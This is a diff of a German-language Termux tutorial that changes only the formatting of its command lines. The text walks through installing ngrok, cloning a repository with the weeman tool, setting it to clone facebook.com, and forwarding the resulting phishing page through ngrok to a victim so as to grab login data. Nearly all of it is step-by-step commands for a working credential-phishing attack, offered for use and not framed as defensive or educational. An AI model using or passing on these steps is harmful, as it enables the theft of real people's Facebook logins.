@@ -10,14 +10,14 @@ Teilen Sie Ihre Links über das Internet und schappen Sie sich die Login-daten
 
 -in Termux nutzen wir jetzt folgende Befehle:
 
-1. cd /sdcard/download
-2. unzip ngrok.zip
-3. cp ngrok $HOME
-4. cd $HOME
-5. ls
-6. chmod 777 ngrok
-7. ./ngrok
-8. ./ngrok authtoken 844ZM.... [kopiere den Orginal Code der dir angezeigt wird, sobald du dich eingelogt hast]
+1. > cd /sdcard/download
+2. > unzip ngrok.zip
+3. > cp ngrok $HOME
+4. > cd $HOME
+5. > ls
+6. > chmod 777 ngrok
+7. > ./ngrok
+8. > ./ngrok authtoken 844ZM.... [kopiere den Orginal Code der dir angezeigt wird, sobald du dich eingelogt hast]
 
  zu 8.: dieser schritt ist nicht unbedingt notwendig
 
@@ -26,27 +26,27 @@ Teilen Sie Ihre Links über das Internet und schappen Sie sich die Login-daten
 TIPPE
 
 
-  apt update && apt upgrade
+ > apt update && apt upgrade
 
 dann TIPPE
 
 
-  pkg install git
+ > pkg install git
 
 kopieren den folgenden Link
 
 
-  git clone https://github.com/GottModusTermux/G0D
+ > git clone https://github.com/GottModusTermux/G0D
 
-  ls
+ > ls
 
-  cd G0D/weeman
+ > cd G0D/weeman
 
-  pkg install python2
+ > pkg install python2
 
-  ls
+ > ls
 
-  python2 weeman.py
+ > python2 weeman.py
   
 # Ausführen
 
@@ -54,38 +54,38 @@ nach dem Start folgende befehle
 
 -Befehl 1 
 
-  set url yoursite.com
+ > set url yoursite.com
 
 -Befehl 2 
 
-  set port 8080
+ > set port 8080
 
 -Befehl 3 
 
-  set action_url yoursite.com
+ > set action_url yoursite.com
   
 -Befehl 4
 
-  run
+ > run
   
 Nun öffnet ihr einen Browser und sucht
 LOCALHOST:8080 oder 127.0.0.1:8080.
 
 # ERÖFFNE EINE FACEBOOK-PHISHING SEITE.
 
--TIPPE
+-TIPPE:
 
-  cd G0D/weeman
+ > cd G0D/weeman
 
-  python2 weeman.py
+ > python2 weeman.py
 
-  set url https://www.facebook.com/
+ > set url https://www.facebook.com/
 
-  set port 8080
+ > set port 8080
 
-  set action_url https://www.facebook.com/
+ > set action_url https://www.facebook.com/
 
-  run
+ > run
 
 Jetzt können Sie Ihre Facebook-Phishing Seite einfach per Ngrok an Ihr Opfer weiterleiten...
 
